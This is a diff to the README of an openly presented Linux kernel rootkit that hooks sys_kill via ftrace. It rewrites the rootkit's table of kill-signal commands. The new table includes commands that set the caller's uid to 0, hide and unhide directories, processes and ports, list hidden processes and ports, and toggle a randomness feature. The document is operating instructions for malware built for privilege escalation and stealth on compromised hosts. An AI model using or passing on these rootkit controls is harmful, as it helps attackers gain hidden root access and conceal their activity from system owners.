@@ -49,14 +49,23 @@ This is my first rootkit that utitlises ftrace to hook onto `sys_kill` which doe
 
  ### Commands
  ```text
-kill -60 1 # Sets uid to 0
-kill -60 0 # Reset uid to original
+/* Credential Handler */
+kill -34 1 # Sets uid to 0
+kill -34 0 # Reset uid to original
 
-kill -61 1 # Hide directories, processes and itself
-kill -61 0 # Unhide directories, processes and itself
-kill -62 <pid> # Add process to hide
-kill -63 <pid> # Remove process to hide
+/* Presence Handler */
+kill -35 1 # Hides presence of dirs, processes and ports
+kill -35 0 # Unhides presence of dirs, processes and ports
 
-kill -64 1 # Activates randomness
-kill -64 0 # Deactivates randomness
+kill -41 <pid> # Adds hidden process
+kill -42 <pid> # Removes hidden process
+kill -43 1     # Prints all hidden processes
+
+kill -51 <port> # Adds hidden port
+kill -52 <port> # Removes hidden port
+kill -53 1     # Prints all hidden ports
+
+/* Randomness Handler */
+kill -36 1 # Activates randomness
+kill -36 0 # Deactivates randomness
  ```
